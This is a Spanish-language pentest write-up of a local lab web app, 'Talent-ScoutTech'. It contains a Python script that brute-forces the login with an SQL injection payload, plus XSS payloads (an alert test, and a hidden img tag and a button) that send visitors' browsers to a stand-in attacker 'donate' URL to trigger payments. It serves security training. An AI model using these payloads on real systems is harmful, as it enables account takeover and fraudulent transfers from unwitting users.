# Pentesting de la Web Web_Talent-ScoutTech

# SQLi

En la pagina de login `list_players.php` cuando ponemos `"` en el usuario, y en la contrasela ponemos cualquier cosa, nos salta un error:

![imagene1.png](/img/e1a1715308d347f986417fec99980204(1).png)

Esta es la consulta que ejecuta:
`"SELECT userId, password FROM users WHERE username = """`

Usamos el diccionario personalizado que nos proporcionaron:
`["password", "123456", "12345678", "1234", "qwerty", "dragon"]`

Creamos un script en python que nos proporcione un poco de fuerza bruta ayudandonos de la sentencia `"OR password="contraseña"-- -` en el usuario y en contraseña la misma contraseña que probamos arriba en usuario.

Script:

```py
import requests

# URL del formulario de inicio de sesión
url = 'http://localhost:8080/list_players.php'

# Lista de contraseñas comunes para probar
passwords = ['password', '123456', '12345678', '1234', 'qwerty', 'dragon']

# Lista de usuarios (no se usa directamente en este script optimizado)
usernames = ["pepito", "luis", "marcos", "lucas", "eduardo", "carlos", "ana", "lorena", "ignacio", "maria"]

# Iteramos sobre cada contraseña
for password in passwords:
    # Creamos el payload con la inyección SQL
    payload = {
        'username': f'" OR password="{password}"-- -',  # Inyección SQL en el campo de usuario
        'password': password  # Contraseña actual en el ciclo
    }
    
    # Enviamos la solicitud POST al servidor
    response = requests.post(url, data=payload)
    
    # Verificamos si el inicio de sesión fue exitoso
    if 'Players list' in response.text:  # Ajustar según la respuesta real del servidor
        print(f'Login successful: Password: {password}')
        break  # Salimos del bucle si encontramos una contraseña válida
```


Ejecutamos el script:

![imagen2.png](/img/596842eb5a55467595e097021951d0c5.png)

De esta manera nos podemos loguear en la pagina web con un usuario con contraseña 1234.

Para saber el usuario he mirado en la cookies ya que se guardan en ella el usuario y la contraseña.

![imagenotra.png](/img/Captura%20de%20pantalla%202025-01-28%20182813.png)

Lo que pasa es que en el usuario aparece la sentencia que hemos usado, por lo que he tenido que seguir investigando, y descubrimos que cuando ponemos un comentario en un de los jugadores, aparece el nombre de nuestro usuario.

![imagenotra2.png](/img/Captura%20de%20pantalla%202025-01-28%20183045.png)

Por lo que ahora vamos a probrar loguearnos con ese usuario y con la contraseña 1234.

Nos logueamos:

![imagenotra3.png](/img/Captura%20de%20pantalla%202025-01-28%20183347.png)

Y volvemos a ver la cookies, y como podemos ver el loguin a sido exitoso.

![imagenotra4.png](/img/Captura%20de%20pantalla%202025-01-28%20183424.png)

---
---
---

# XSS

Las pagina `show_comments.php` es vulnerable a XSS.

Se a inyectado un codigo de prueba: `<script>alert('XSS detectado');</script>`

![41ea2774a6f97f5ef5b1b41b44b853d9.png](img/1b6f26a48af54c9391817a9d553ef49a.png)

Buscando mas paginas con XSS encontramos las siguientes:

- `insert_player.php`
- `buscador.php`

La `insert_player.php` podemos añadir condigo malicioso en el campo `Team`, por lo que cuando vean a los usuarios, le saltaran el XSS que programemos.

Añadimos codigo XSS en la pagina `insert_player.php` en el campo `Team` y añadimos un boton el cual llevaria a los usuarios a donarnos 100€.

Codigo:

```html
<a href="http://web.pagos/donate.php?amount=100&receiver=attacker" style="text-decoration: none;">
        <button>Profile</button>
</a>
```

![38b7017f2f31b6d7a005f268fb9d9384.png](img/03af9c417a2f49188163237af66cf37f(1).png)


Ahora para hacer que los usuarios que visiten la web nos agan un pago atravez de la web: `http://web.pagos/donate.php?amount=100&receiver=attacker`, podremos el enlace en un comentario con XSS dentro de uno de los perfiles.

XSS:
```html
<img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none;">
```

Este codigo lo que hace es que cuando un usuario entre en los comentarios, en segundo plano se ejecute el link y nos hagan el pago.

![0a13e9f7b736f4e8f20557289873ada7.png](img/1f757a8b39e14bc0b039c9a4b7d07861(2).png)